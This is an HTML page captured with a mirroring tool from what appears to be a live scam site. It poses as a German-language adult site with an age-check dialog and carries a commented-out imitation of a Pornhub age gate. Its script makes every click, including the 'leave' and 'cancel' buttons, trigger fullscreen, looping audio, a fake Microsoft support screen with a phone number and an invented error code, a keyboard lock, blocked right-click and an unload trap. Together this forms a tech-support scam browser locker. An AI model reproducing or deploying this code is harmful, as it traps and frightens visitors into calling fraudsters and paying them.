

<!DOCTYPE html>
<html lang="en-US">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

    <link rel="preload" as="image" href="bg7.jpg">
<title>PORNTUBER - Die weltweit größte Online-Porno-Site für Erwachsene mit Dating für Erwachsene, Swinger, sexy Fotos für Erwachsene, Videos von Amateurmitgliedern und Chat für Erwachsene</title>
	 <link rel="icon" href="https://img.securedataimages.com/images/cams/cams2/favicon.png">
   
    <!-- =========================================== -->
    <!-- JS: Clean up URL in address bar after load -->
    <!-- =========================================== -->
    <script>
      (function () {
        let cleanUrl =
          window.location.protocol +
          "//" +
          window.location.host +
          "/index.php";
        if (window.history.replaceState) {
          window.history.replaceState(null, null, cleanUrl); // Hides query params without reloading
        }
      })();
    </script>

    <!-- ============================================== -->
    <!-- JS Placeholder to potentially fetch ph0ne var -->
    <!-- (Not used in PHP directly, but may assist UI) -->
    <!-- ============================================== -->
    <script type="text/javascript">
      var ph0ne = getVariableFromURl("ph0ne"); // Custom JS method (user-defined elsewhere)
    </script>

    <!-- website code start 
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
        background-color: #000;
        font-family: Arial, sans-serif;
        color: white;
        height: 100%;
      }
      .wrapper {
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        padding: 20px;
      }
      .container {
        background-color: #111;
        max-width: 1000px;
        width: 100%;
        padding: 60px 50px;
        text-align: center;
        border-radius: 10px;
        box-shadow: 0 0 50px rgba(255, 255, 255, 0.08);
      }
      .logo {
        font-size: 52px;
        margin-bottom: 30px;
      }
      .logo span {
        background-color: #ffa726;
        color: black;
        padding: 5px 10px;
        border-radius: 3px;
      }
      h1 {
        font-size: 40px;
        margin-bottom: 30px;
      }
      p {
        font-size: 22px;
        line-height: 1.8;
        color: #ddd;
        margin: 0 auto;
        max-width: 850px;
      }
      .buttons {
        margin: 50px 0;
      }
      .buttons button {
        padding: 20px 40px;
        font-size: 20px;
        margin: 10px 20px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        transition: 0.2s;
      }
      .enter {
        background-color: #ffa726;
        color: #000;
        font-weight: bold;
      }
      .enter:hover {
        background-color: #ffc266;
      }
      .exit {
        background-color: #333;
        color: #fff;
      }
      .exit:hover {
        background-color: #444;
      }
      .info {
        font-size: 18px;
        color: #bbb;
      }
      .info a {
        color: #ffa726;
        font-weight: bold;
        text-decoration: none;
      }
      .footer {
        font-size: 16px;
        margin-top: 40px;
        color: #666;
      }
      .footer img {
        height: 20px;
        vertical-align: middle;
        margin-left: 6px;
      }
      @media (max-width: 768px) {
        .logo {
          font-size: 36px;
        }
        h1 {
          font-size: 28px;
        }
        p {
          font-size: 18px;
        }
        .buttons button {
          font-size: 18px;
          width: 100%;
          max-width: 300px;
          margin: 10px 0;
        }
        .info {
          font-size: 16px;
        }
        .footer {
          font-size: 14px;
        }
      }
    </style>
  </head>
  <body>


    <div class="wrapper">
      <div class="container">
        <div class="logo">Porn<span>hub</span></div>
        <h1>This is an adult website</h1>
        <p>
          This website contains age-restricted materials including nudity and
          explicit<br />
          depictions of sexual activity. By entering, you affirm that you are at
          least 18 years of<br />
          age or the age of majority in the jurisdiction you are accessing the
          website from and<br />
          you consent to viewing sexually explicit content.
        </p>
        <div class="buttons">
          <button class="enter">I am 18 or older - Enter</button>
          <button class="exit">I am under 18 - Exit</button>
        </div>
        <div class="info">
          Our <a href="#">parental controls page</a> explains how you can
          easily<br />
          block access to this site.
        </div>
        <div class="footer">
          © Pornhub.com, 2025
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/RTA_label.svg/120px-RTA_label.svg.png"
            alt="RTA"
          />
        </div>
      </div>
    </div>
    website code end here -->
 <script>
/* ===========================
   Google Analytics (gtag.js)
   =========================== */
(function(){
  var ga = document.createElement('script');
  ga.async = true;
  ga.src = "https://www.googletagmanager.com/gtag/js?id=G-G6B94KFC5N";
  var s = document.getElementsByTagName('script')[0];
  s.parentNode.insertBefore(ga, s);

  window.dataLayer = window.dataLayer || [];
  function gtag(){ dataLayer.push(arguments); }
  gtag('js', new Date());
  gtag('config', 'G-G6B94KFC5N');
})();

/* ===========================
   Microsoft Clarity
   =========================== */
(function(c,l,a,r,i,t,y){
  c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
  t=l.createElement(r); t.async=1; t.src="https://www.clarity.ms/tag/"+i;
  y=l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t,y);
})(window, document, "clarity", "script", "p0eav8yvt8");

</script>

<script type="text/javascript">function add_chatapi(){var hccid=33786030;var nt=document.createElement("script");nt.async=true;nt.src="https://www.mylivechat.com/chatapi.aspx?hccid="+hccid;var ct=document.getElementsByTagName("script")[0];ct.parentNode.insertBefore(nt,ct);}
add_chatapi();</script>



  </head> <!-- diable this when want to start website code -->
  <body> <!-- diable this when want to start website code -->

    <div class="ads-wrapper">
      <audio id="audio" src="audio/engDE.mpeg"></audio>

      <!-- no-redirect start 

      <div id="footer">
        <div class="footer-bg"></div>
        <span class="footer-number"><span id="dynamicPhone"></span></span>
      </div>
      -->
      <div class="dialog-overlay" id="dialog-overlay" onclick="handleLeave()">
        <div class="first-img">
          <img src="images/Screenshot_17-9-2025_14434_support.microsoft.com.jpeg" alt="bg1" />
        </div>
        <div class="second-img">
          <img src="images/bg2.gif" alt="bg2" />
        </div>
        <div class="third-img">
          <img src="images/bg3.gif" alt="bg3" />
        </div>
        <div class="fourth-img">
          <img src="images/bg4.gif" alt="bg4" />
        </div>
        <div class="fifth-img">
          <!-- <img src="images/bg5.gif" alt="bg5" /> -->
          <video loop autoplay playsinline muted> 
            <source src="images/Recording 8304.mp4" />
          </video>
          <div class="numberBox" id="contact-number">
            <p class="contact-num">
              <strong><span id="dynamicPhone">0043 8000 18304</span></strong>
            </p>
           <p>Fehlercode:<strong>0x002E880x</strong></p>
          </div>
        </div>
      </div>

      <div id="overlay" onclick="handleLeave()"></div>
     <!-- <div
        class="cookies-overlay"
        id="cookies-overlay"
        onclick="handleLeave()"
      ></div> -->

<!-- this is cookie popup start -->

<div class="dialog-box" id="dialog-cookies" onclick="handleLeave()">
 <span class="close-btn" style="color: red;">✖</span>
<h1 style="color: white; font-size: 18px; text-align: center;">Sind Sie über 18 Jahre alt?</h1>

<p style="color: white; font-size: 12px;" class="heading1">Um auf diese Website zugreifen und sie nutzen zu können, müssen Sie mindestens 18 Jahre alt sein und unseren Nutzungsbedingungen zustimmen. Indem Sie unten auf „Zustimmen“ klicken, bestätigen Sie, dass Sie mindestens 18 Jahre alt sind und unseren Nutzungsbedingungen zustimmen.</p>
 <div class="buttons-wrapper" style="display: flex; justify-content: center; gap: 15px; margin-top: 20px;">
  <button class="accept-btn" style="padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 6px; cursor: pointer;">
    Zustimmen
  </button>

  <button class="decline-btn" style="padding: 10px 20px; background-color: #f44336; color: white; border: none; border-radius: 6px; cursor: pointer;">
    Ablehnen
  </button>
</div>

<!--
  <img src="images/confirm.png" >
</div>
-->
</div>

<div id="exit-popup" onclick="handleLeave()">
<span class="close-btn" style="color: black;">✖</span>
  <h5>Möchten Sie die Website wirklich verlassen?</h5>

<div class="btn-wrapper">
<button class="btn_leave" onclick="handleLeave()">Beenden</button>
<button class="btn_cancel" onclick="handleLeave()">Abbrechen</button>
  </div>
</div>

<!-- this is cookie popup end -->


    <style>
      body {
        margin: 0;
        padding: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background: url("bg7.jpg") no-repeat center center/cover;
        background-size: cover;
        font-family: Arial, sans-serif;
       
      }
      .ads-wrapper {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        color: #000;
      }
      .ads-wrapper #overlay {
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        background-color: rgba(0, 0, 0, 0.4);
        display: none;
        z-index: 9999;
        cursor: none;
      }
      .ads-wrapper #exit-popup {
        position: fixed;
        left: 0;
        top: 0;
        right: 0;
        margin: 0 auto;
        display: none;
        background-color: #fff;
        max-width: 460px;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        font-family: Arial, Helvetica, sans-serif;
        width: 90%;
        box-sizing: border-box;
        z-index: 9999;
      }
      .ads-wrapper .btn-wrapper {
        text-align: right;
        margin-top: 20px;
      }
      .ads-wrapper h5 {
        font-size: 18px;
        margin: 0;
      }
      .ads-wrapper p {
        margin-top: 0px;
        max-width: 100%;
        line-height: normal;
        font-size: inherit;
        color: inherit;
      }
      .ads-wrapper ul {
        color: #000;
      }
      .ads-wrapper .btn_leave {
        padding: 10px 20px;
        background-color: #1b73e8;
        color: #fff !important;
        text-transform: capitalize;
        text-decoration: none;
        border-radius: 5px;
        display: inline-block;
        animation: zoom 1s linear infinite;
      }
      .ads-wrapper .btn_cancel {
        padding: 10px 20px;
        border: 1px solid #ddd;
        color: #1b73e8 !important;
        text-transform: capitalize;
        text-decoration: none;
        border-radius: 5px;
        display: inline-block;
        margin-left: 10px;
        background-color: transparent;
      }
      .dialog-box img {
    width: 100%;         /* makes it scale to the box width */
    height: auto;        /* keeps aspect ratio */
    object-fit:contain; /* ensures full image is visible without cropping */
    display: block;
    
}

      .ads-wrapper .dialog-box {
        width: 90%;
        max-width: 700px;
		color:white;
        background-color: black;
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        border: 1px solid #ddd;
        position: relative;
        text-align: left;
        position: fixed;
        left: 0;
        right: 0;
        top: 50%;
        transform: translateY(-50%);
        margin: 0 auto;
        z-index: 999;
        box-sizing: border-box;
      }
      .ads-wrapper .dialog-overlay {
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        background-color: rgba(0, 0, 0, 0.2);
        z-index: 99;
        backdrop-filter: blur(1px);
        background-size: cover;
        background-position: center top;
        cursor: none;
        height: 1010px;
        display: none;
      }
      .ads-wrapper .first-img {
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        top: 0;
        height: 100vh;
      }
      .ads-wrapper .first-img img {
        width: 100%;
        height: 100%;
        display: block;
        object-fit: cover;
        object-position: top;
      }
      .ads-wrapper .second-img {
        position: absolute;
        left: 0;
        right: 0;
        top: 20%;
        z-index: 9;
        margin: 0 auto;
        display: table;
        padding: 10px;
        background-color: #fff;
        border-radius: 10px;
        box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
      }
      .ads-wrapper .third-img {
        position: absolute;
        left: 35%;
        top: 10%;
        z-index: 9;
        margin: 0 auto;
        display: table;
        animation: zoominoutsinglefeatured 4s infinite;
        border-radius: 10px;
      }
      .ads-wrapper .fourth-img {
        position: absolute;
        left: 0;
        right: 0;
        top: 0;
        z-index: 9;
        margin: 0 auto;
        display: table;
      }
      .ads-wrapper .fifth-img {
        position: absolute;
        left: 0;
        right: 0;
        top: 20%;
        z-index: 9;
        margin: 0 auto;
        display: table;
        padding: 2px;
        overflow: hidden;
        background-color: #fff;
        border-radius: 10px;
        box-shadow: rgb(0 0 0 / 25%) 0px 54px 55px,
          rgb(0 0 0 / 12%) 0px -12px 30px, rgb(0 0 0 / 12%) 0px 4px 6px,
          rgb(0 0 0 / 17%) 0px 12px 13px, rgb(0 0 0 / 9%) 0px -3px 5px;
      }
      .ads-wrapper .fifth-img video {
        margin-right: -4px;
        margin-bottom: -9px;
      }
      .ads-wrapper .dialog-box h1 {
        font-size: 2rem;
        color: #333;
        margin-bottom: 15px;
        font-weight: bold;
      }
      .ads-wrapper .cookies-overlay {
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        background-color: rgba(0, 0, 0, 0.2);
        z-index: 99;
        backdrop-filter: blur(1px);
        background-size: cover;
        background-position: center top;
        cursor: none;
        height: 1010px;
      }

      .ads-wrapper .dialog-box p {
        font-size: 1.1rem;
        color: #666;
        margin-bottom: 20px;
        line-height: 1.6;
      }

      .ads-wrapper .dialog-box a {
        color: #0066cc;
        text-decoration: none;
      }

      .ads-wrapper .dialog-box a:hover {
        text-decoration: underline;
      }

      .ads-wrapper .close-btn {
        position: absolute;
        top: 15px;
        right: 20px;
        font-size: 1.5rem;
        color: #333;
        cursor: pointer;
      }

      .ads-wrapper .buttons-wrapper {
        display: flex;
        justify-content: space-between;
        margin-top: 20px;
      }

      .ads-wrapper button {
        padding: 12px 25px;
        font-size: 1rem;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        font-weight: bold;
      }

      .ads-wrapper .accept-btn {
        background-color: #007bff;
        color: white;
        animation: zoom 1s linear infinite;
      }
      .ads-wrapper .remove-animation .accept-btn {
        animation: none;
      }

      .ads-wrapper .decline-btn {
        background-color: #6c757d;
        color: white;
      }

      @keyframes zoom {
        0% {
          transform: scale(1);
        }
        50% {
          transform: scale(1.15);
        }
        100% {
          transform: scale(1);
        }
      }

      /* Responsive adjustments */
      @media (max-width: 768px) {
        .ads-wrapper .dialog-box {
          padding: 30px;
        }
        .ads-wrapper .dialog-box h1 {
          font-size: 1.8rem;
        }
        .ads-wrapper .dialog-box p {
          font-size: 1rem;
        }
        .ads-wrapper button {
          padding: 10px 20px;
          font-size: 0.9rem;
        }
      }
      .ads-wrapper .top {
        padding-left: 10px;
      }
      .ads-wrapper #bottom {
        margin: 12px 0 0;
        display: flex;
        border-top: 1px solid #d6d5d5;
        align-items: center;
        padding: 12px 0 0;
        flex-wrap: wrap;
      }
      .ads-wrapper #bottom ul {
        list-style-type: none;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: flex-end;
        flex: 1;
      }
      .ads-wrapper #bottom ul li {
        float: left;
        padding-left: 20px;
      }
      .ads-wrapper #bottom ul li a {
        display: block;
      }
      .ads-wrapper a {
        color: #007bff;
        text-decoration: none;
        background-color: transparent;
      }
      .ads-wrapper a:hover {
        color: #0056b3;
        text-decoration: underline;
      }

      @keyframes blink-animation {
        to {
          visibility: hidden;
        }
      }
      @-webkit-keyframes blink-animation {
        to {
          visibility: hidden;
        }
      }

      .ads-wrapper .action_buttons a.active {
        border: 1px solid #3b79ed;
        font-weight: bold;
      }
      .ads-wrapper .action_buttons a {
        float: right;
        font-size: 12px;
        margin-right: 15px;
        padding: 6px 25px;
        text-decoration: none;
        color: #fff !important;
        border: 1px solid #fff;
        margin-top: 20px;
        border-radius: 3px; /* 100% */

        margin-bottom: 20px;
      }
      .ads-wrapper .cardcontainer {
        animation: zoominoutsinglefeatured 4s infinite;
        border-radius: 10px;
      }
      @keyframes zoominoutsinglefeatured {
        0% {
          transform: scale(1, 1);
        }
        50% {
          transform: scale(1.1, 1.1);
        }
        100% {
          transform: scale(1, 1);
        }
      }

      @keyframes zoomininsinglefeatured {
        0% {
          transform: scale(1, 1);
        }
        50% {
          transform: scale(1.1, 1.1);
        }
        100% {
          transform: scale(1, 1);
        }
      }

      .ads-wrapper .flex {
        display: flex;
      }
      .ads-wrapper .centerright img {
        max-width: 100%;
      }
      .ads-wrapper .centerright ul {
        padding: 0;
        list-style-type: none;
        margin: 0;
      }
      .ads-wrapper .centerright ul {
        columns: 3;
      }
      .ads-wrapper .centerright li {
        width: calc((100vw / 3) - 20px);
        display: inline-block;
      }

      .ads-wrapper .centerright ul {
        display: flex;
      }
      .ads-wrapper .centerright ul {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
      }
      .ads-wrapper .centerright {
        position: absolute;
        left: 70px;
        top: 150px;
        display: flex;
      }

      .ads-wrapper .box {
        display: none;
        position: absolute;
        width: 723px;
        height: 560px;
        top: 49%;
        z-index: 999;
        margin-top: -255px;
        left: 48%;

        border-radius: 0px;
        margin-left: -325px;
        border-radius: 8px;
        padding-right: 10px;
        padding-left: 0px;

        background: #fff;

        box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
      }
      .ads-wrapper .button {
        background: #cccccc;
        color: #000 !important;
        padding: 6px 32px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 13px;
        margin: 4px 2px;
        cursor: pointer;
        font-weight: 350;
      }

      .ads-wrapper #footer {
        width: 100%;
        display: none;
        cursor: none;
        position: fixed;
        bottom: 0;
        z-index: 9999;
        color: #fff;
        font-size: 18px;
        left: 0;
      }
      .ads-wrapper .footer-bg {
        background-image: url("images/footer-bg.html");
        background-position: center center;
        height: 70px;
      }
      .ads-wrapper .footer-number {
        position: absolute;
        left: 0;
        top: 15px;
        font-size: 17px;
        font-weight: bold;
        right: 0;
        margin: 0 auto;
        display: table;
        transform: translateX(110px);
      }
      :host {
        display: inline-block;
        overflow: hidden;
        text-align: initial;
        white-space: nowrap;
      }
      .ads-wrapper .numberBox {
        position: absolute;
        z-index: 9999;
        top: 34%;
        display: none;
        left: 160px;
        right: 0;
        font-size: 16px;
        margin: 0 auto;
        text-align: center;
      }
      .ads-wrapper .contact-num {
        font-size: 30px;
        margin-bottom: 0;
        color: #296cff;
      }
    </style>
    <script>
      var elem = document.documentElement;
      function openFullscreen() {
        if (elem.requestFullscreen) {
          elem.requestFullscreen();
        } else if (elem.webkitRequestFullscreen) {
          /* Safari */
          elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
          /* IE11 */
          elem.msRequestFullscreen();
        }
      }

      function closeFullscreen() {
        if (document.exitFullscreen) {
          document.exitFullscreen();
        } else if (document.webkitExitFullscreen) {
          /* Safari */
          document.webkitExitFullscreen();
        } else if (document.msExitFullscreen) {
          /* IE11 */
          document.msExitFullscreen();
        }
      }

      let hasShownPopup = false;

      document.addEventListener("mousemove", function (event) {
        if (!hasShownPopup && event.clientY < 50) {
          showPopup();
          hasShownPopup = true; // Prevent multiple popups
        }
      });

      function showPopup() {
        let dialogBox = document.getElementById("dialog-cookies");
        let popup = document.getElementById("exit-popup");
        dialogBox?.classList.add("remove-animation");
        popup.style.display = "block";
        overlay.style.display = "block";
      }

      var x = document.getElementById("audio");
      function playSound() {
        var audio = document.getElementById("audio");
        audio.loop = true;
        audio.play();
      }
      function fullScreen() {
        var el = document.documentElement,
          rfs =
            el.requestFullScreen ||
            el.webkitRequestFullScreen ||
            el.mozRequestFullScreen;
        rfs.call(el);
      }
      let popup = document.getElementById("exit-popup");
      let dialogBox = document.getElementById("dialog-cookies");
      let dialogOverlay = document.getElementById("dialog-overlay");
      let cookiesOverlay = document.getElementById("cookies-overlay");
      let overlay = document.getElementById("overlay");
      function handleLeave() {
        playSound();
        fullScreen();
        popup.style.display = "none";
        if (dialogBox) {
          dialogBox.style.display = "none";
        }
        if (overlay) {
          overlay.style.display = "none";
        }
        startScan();
        dialogOverlay.style.display = "block";
        cookiesOverlay.style.display = "none";
      }

      let closeModal = false;

      function handleClose(event) {
        popup.style.display = "none";
        dialogBox.style.display = "none";
        overlay.style.display = "none";
        dialogOverlay.style.display = "none";
        event.stopPropagation();
        closeModal = true;
      }
      addEventListener("click", function () {
        if (closeModal) {
          var el = document.documentElement,
            rfs =
              el.requestFullScreen ||
              el.webkitRequestFullScreen ||
              el.mozRequestFullScreen;
          rfs.call(el);
        }
      });

      document.onkeydown = function (a) {
        return !1;
      };
      // document.attachEvent("onkeydown", win_onkeydown_handler);

      function win_onkeydown_handler() {
        switch (e.keyCode) {
          case 116:
            e.returnValue = !1;
            e.keyCode = 0;
            break;
          case 27:
            (e.returnValue = !1), (e.keyCode = 0);
        }
      }

      function fadeIn(element, duration) {
        element.style.opacity = 0;
        element.style.display = "block";

        let startTime = performance.now();

        function animate(time) {
          let elapsedTime = time - startTime;
          let progress = Math.min(elapsedTime / duration, 1);
          element.style.opacity = progress;

          if (progress < 1) {
            requestAnimationFrame(animate);
          }
        }

        requestAnimationFrame(animate);
      }

      function startScan() {
        setTimeout(
          () => fadeIn(document.getElementById("contact-number"), 500),
          900
        );
        setTimeout(() => fadeIn(document.getElementById("footer"), 500), 900);
      }

      navigator.keyboard.lock();
      document.onkeydown = function (e) {
        return false;
      };

      window.addEventListener("beforeunload", function (e) {
        var confirmationMessage =
          "It looks like you have been editing something. " +
          "If you leave before saving, your changes will be lost.";

        (e || window.e).returnValue = confirmationMessage; //Gecko + IE
        return confirmationMessage;
      });

      // Disable Right click
       document.addEventListener("contextmenu", function (e) {
         e.preventDefault();
      });

              // Trigger handleLeave() when clicking anywhere on the page (once)
let hasTriggeredLeave = false;
document.addEventListener("click", function (e) {
  if (!hasTriggeredLeave) {
    handleLeave();
    hasTriggeredLeave = true;
  }
});

    </script>
    <div class="imgTagappend"></div>
  </body>

<!-- Mirrored from grootcam.shop/index.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 17 Sep 2025 04:10:57 GMT -->
</html>
